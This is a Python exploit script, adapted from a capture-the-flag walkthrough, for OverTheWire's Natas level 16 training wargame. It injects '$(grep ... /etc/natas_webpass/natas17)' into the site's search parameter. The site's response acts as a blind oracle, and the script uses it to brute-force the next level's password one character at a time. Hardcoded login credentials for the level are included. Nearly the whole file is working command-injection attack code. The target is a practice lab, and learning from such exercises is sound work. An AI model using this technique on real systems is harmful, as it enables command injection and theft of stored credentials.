# Code taken from here: https://learnhacking.io/overthewire-natas-level-16-walkthrough/
# Small modiciations made

import requests,string

url = "http://natas16.natas.labs.overthewire.org"
auth_username = "natas16"
auth_password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
PASSWORD_LEN = 32

characters = ''.join([string.ascii_letters,string.digits])

# Uncomment if you want to run the char checking part
# password_dictionary = []
password_dictionary = list("bhjkoqsvwCEFHJLNOT05789")

# Begin by building a dictionary of characters found in the password
# This will greatly decrease the complexity for our following attempts
# for char in characters:
#   payload = "$(grep " + char + " /etc/natas_webpass/natas17)zigzag"
#   uri = ''.join([url, '?needle=', payload, '&submit=Search'])
#   r = requests.get(uri, auth=(auth_username,auth_password))
#   if 'zigzag' not in r.text:
#     password_dictionary.append(char)
#     print("Password Dictionary: {0}".format(''.join(password_dictionary)))
        
# print("Dictionary build complete.")
# print("Dictionary: {0}".format(password_dictionary))
# print("Dictionary joined: {0}".format(''.join(password_dictionary)))

print("Finding first part of password")
password = ""
# password = "bo7LFNb8vwhHb9s75hokh5TF0OC"
iter_length = len(password_dictionary)
iter_counter = 0
continue_loop = 1

# Find the first part of the password (password + char)
while continue_loop:
  for c in password_dictionary:
    if (iter_counter == iter_length):
      print("Tried through the password dictionary, no more matches")
      iter_counter = 0
      continue_loop = 0
      break

    print("Trying with the string {0}".format(password + c))
    payload = "$(grep " + password + c + " /etc/natas_webpass/natas17)zigzag"
    uri = ''.join([url, '?needle=', payload, '&submit=Search'])

    r = requests.get(uri, auth=(auth_username,auth_password))
    if 'zigzag' not in r.text:
      password += c
      print("Password of length {0} is {1}\n".format(len(password), password))
      iter_counter = 0
    else: 
      iter_counter += 1

print()
print("===================")
print("Continuing to the next part")
print("===================\n")

# Find the second part of the password (char + password)
while True:
  for c in password_dictionary:
    if (iter_counter == iter_length):
      print("Tried through the password dictionary, no more matches")
      if len(password) != PASSWORD_LEN:
        print("Password is not correct, as it should be of length {0} and was {1}".format(PASSWORD_LEN, len(password)))
      else:
        print("Final password is {0}".format(password))
      quit()

    print("Trying with the string {0}".format(c + password))
    payload = "$(grep " + c + password + " /etc/natas_webpass/natas17)zigzag"
    uri = ''.join([url, '?needle=', payload, '&submit=Search'])

    r = requests.get(uri, auth=(auth_username,auth_password))
    if 'zigzag' not in r.text:
      password = c + password
      print("Password of length {0} is {1}\n".format(len(password), password))
      iter_counter = 0
    else: 
      iter_counter += 1


